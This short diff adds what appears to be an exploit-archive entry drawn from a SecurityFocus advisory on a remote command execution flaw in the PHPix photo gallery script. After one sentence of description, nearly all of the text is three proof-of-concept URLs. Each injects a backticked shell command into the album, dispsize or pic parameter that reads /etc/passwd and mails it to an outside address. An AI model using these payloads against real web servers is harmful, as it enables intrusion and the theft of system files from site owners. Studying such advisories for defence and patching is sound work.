@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/9458/info
+
+It has been reported that PHPix is vulnerable to a remote command execution vulnerability due to poor handling of externally supplied data such as shell metacharacters. This issue may allow unauthorized access to the affected system with the privileges of the web server hosting the vulnerable program.
+
+http://www.example.com/phpix/index.phtml?mode=view&album=`cat%20/etc/passwd%20|%20mail%20someone@somewhere.com`&pic=A-10.jpg&dispsize=640&start=0
+
+http://www.example.com/phpix/index.phtml?mode=view&album=Sample+Album&pic=A-10.jpg&dispsize=`cat%20/etc/passwd%20|%20mail%20someone@somewhere.com`&start=0
+
+http://www.example.com/phpix/index.phtml?mode=view&album=Sample+Album&pic=`cat%20/etc/passwd%20|%20mail%20someone@somewhere.com`&dispsize=640&start=0
